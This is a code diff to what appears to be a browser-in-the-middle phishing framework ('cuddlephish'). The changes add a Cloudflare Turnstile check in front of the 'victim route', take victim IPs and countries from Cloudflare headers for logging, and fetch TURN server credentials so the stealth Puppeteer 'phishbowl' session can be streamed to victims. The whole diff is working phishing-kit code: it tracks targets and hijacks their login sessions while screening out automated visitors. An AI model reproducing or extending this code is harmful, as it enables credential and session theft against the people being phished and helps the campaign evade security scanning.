@@ -4,6 +4,7 @@ const __dirname = path.resolve()
 import got from 'got'
 import Fastify from 'fastify'
 import fastify_io from 'fastify-socket.io'
+import fastifyFormbody from 'fastify-formbody';
 import puppeteer from 'puppeteer-extra'
 import StealthPlugin from 'puppeteer-extra-plugin-stealth'
 puppeteer.use(StealthPlugin())
@@ -65,6 +66,28 @@ const fastify = Fastify({
 //used to set up websockets
 fastify.register(fastify_io, {maxHttpBufferSize: 1e11})
 
+/***************** TURNSTILE CONFIGURATION *****************/
+// Check if Turnstile is enabled
+const turnstile_enabled = config.enable_turnstile;
+let verifiedSessions = new Set(); // Store verified session IDs
+let turnstile_site_key;
+let turnstile_secret_key;
+
+if (turnstile_enabled) {
+  // Read the site key and secret key from the config
+  turnstile_site_key = config.cloudflare_turnstile_site_key;
+  turnstile_secret_key = config.cloudflare_turnstile_secret_key;
+  // Check if the site key and secret key are defined and not empty
+  if (!turnstile_site_key || !turnstile_secret_key) {
+    console.error('[!] Turnstile site key or secret key is missing!');
+    process.exit(1);
+  }
+	//register formbody plugin -> needed for turnstile verification
+	fastify.register(fastifyFormbody);
+}
+/***************** END TURNSTILE CONFIGURATION *****************/
+
+
 //a bucket full of browsers :)
 var browsers = []
 
@@ -86,18 +109,64 @@ fastify.route({
   }
 })
 
+
+//turnstile verification
+fastify.post('/verify', async (req, reply) => {
+	console.log("FLAG2");
+  // If Turnstile is disabled, reject the request to this path
+  if (!turnstile_enabled) {
+    return reply.type('text/html').send("403")
+  }
+  
+  const token = req.body['cf-turnstile-response'];
+
+  const response = await got.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+    form: {
+      secret: turnstile_secret_key,
+      response: token
+    }
+  });
+
+  const result = JSON.parse(response.body);
+
+  if (result.success) {
+    // Verification succeeded, add a session ID to identify the user
+    const sessionId = req.headers['x-session-id'];
+    verifiedSessions.add(sessionId);
+    return reply.redirect('/');
+  } else {
+    return reply.send('Verification failed. Please try again.');
+  }
+});
+
+
 //standard victim route
 fastify.route({
   method: ['GET'],
   url: '/*',
   handler: async function (req, reply) {
-    let client_ip = req.headers['x-real-ip']
+    // check if cf-connecting-ip is present, if not, use x-real-ip
+    let client_ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip']
+    let client_country = req.headers['cf-ipcountry'] || 'N/A';
     let tracking_id = pm ? pm.tacking_id : 'tracking_id'
     let target_id = req.query[tracking_id] ? req.query[tracking_id] : "unknown"
+    let sessionId = '';
+
     if(pm){
       ship_logs({"event_ip": client_ip, "target": target_id, "event_type": "CLICK", "event_data": req.url})
     }
-    console.log('client_ip: ' + client_ip)
+
+    // if turnstile is enabled, check if the session is verified
+    if (turnstile_enabled) {
+      sessionId = req.headers['x-session-id'];
+      if (!verifiedSessions.has(sessionId)) {
+        // Serve the Turnstile page if not verified
+        let stream = fs.createReadStream(__dirname + "/turnstile.html").pipe(replace(/YOUR_SITE_KEY/, turnstile_site_key));;
+        return reply.type('text/html').send(stream);
+      }
+    }
+
+    console.log('[>] Client Connected:', client_ip, 'From:', client_country)
     //if(config.admin_ips.includes(client_ip)){
       let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
       reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)))
@@ -112,7 +181,7 @@ fastify.route({
   method: ['GET'],
   url: '/broadcast',
   handler: async function (req, reply) {
-    let client_ip = req.headers['x-real-ip']
+    let client_ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip']
     //only allow requests that have not traversed our HTTP server reverse proxy
     if(client_ip == undefined){
       let stream = fs.createReadStream(__dirname + "/broadcast.html")
@@ -128,8 +197,8 @@ fastify.route({
   method: ['GET'],
   url: '/admin',
   handler: async function (req, reply) {
-    let client_ip = req.headers['x-real-ip']
-    console.log('admin_ip: ' + client_ip)
+    let client_ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip']
+    console.log('[>] Admin IP:', client_ip)
     if(config.admin_ips.includes(client_ip)){
       let stream = fs.createReadStream(__dirname + "/admin.html")
       reply.type('text/html').send(stream.pipe(replace(/SOCKET_KEY/, config.socket_key)))
@@ -246,6 +315,9 @@ async function get_browser(target_page){
     //xvfb_args: ["-screen", "0", '1280x720x24', "-ac"]
     xvfb_args: ["-screen", "0", '2880x1800x24', "-ac"]
   })
+
+  console.log("[>] Tab Title: " + target.tab_title)
+
   xvfb.start((err)=>{if (err) console.error(err)})
   let puppet_options = [
     "--ignore-certificate-errors", //ignore sketchy TLS on the target service in case our target org is lazy with their certs
@@ -318,8 +390,41 @@ async function get_browser(target_page){
   return browser
 }
 
+/***************** CLOUDFLARE TURN SERVER *****************/
+async function getTurnCredentials() {
+  // Read Cloudflare TURN Token ID and API Token from the config
+  const cfTurnTokenId = config.cloudflare_turn_token_id;
+  const cfApiToken = config.cloudflare_turn_api_token;
+
+  try {
+    const response = await got.post(`https://rtc.live.cloudflare.com/v1/turn/keys/${cfTurnTokenId}/credentials/generate`, {
+      headers: {
+        'Authorization': `Bearer ${cfApiToken}`,
+        'Content-Type': 'application/json'
+      },
+      json: { ttl: 86400 }, // Time to live for credentials
+      responseType: 'json'
+    });
+
+    return response.body.iceServers; // Return the TURN credentials (iceServers array)
+  } catch (error) {
+    console.error('[!] Error fetching TURN credentials:', error);
+    return null;
+  }
+}
+/***************** END CLOUDFLARE TURN SERVER *****************/
+
 fastify.ready(async function(err){
   if (err) throw err
+   // Fetch TURN credentials when the server starts
+  let turnServers = [];
+  turnServers = await getTurnCredentials();
+  if (turnServers) {
+    console.log('[>] TURN Servers Received from Cloudflare!');
+  } else {
+    console.error('[!] Failed to fetch TURN servers from Cloudflare');
+  }
+
   var empty_phishbowl = await get_browser(target.login_page)
   fastify.io.use((socket, next) => {
     const token = socket.handshake.auth.token;
@@ -338,8 +443,12 @@ fastify.ready(async function(err){
   });
   browsers.push(empty_phishbowl)
   fastify.io.on('connect', function(socket){
-    console.info('Socket connected!', socket.id)
+    console.info('[>] Socket Connected!', socket.id)
     socket.on('new_broadcast', async function(browser_id){
+      // Send TURN servers to the client-side
+      if (turnServers) {
+        socket.emit('turn_servers', turnServers);
+      }
       const browser = browsers.get('browser_id', browser_id)
       browser.socket_id = socket.id
       browser.target_page.on('framenavigated', function(frame){
@@ -351,6 +460,10 @@ fastify.ready(async function(err){
       })
     })
     socket.on('new_phish', async function(viewport_width, viewport_height, client_ip, target_id){
+      // Send TURN servers to the client-side
+      if (turnServers) {
+        socket.emit('turn_servers', turnServers);
+      }
       empty_phishbowl.victim_ip = client_ip
       empty_phishbowl.victim_target_id = target_id
       empty_phishbowl.victim_width = viewport_width
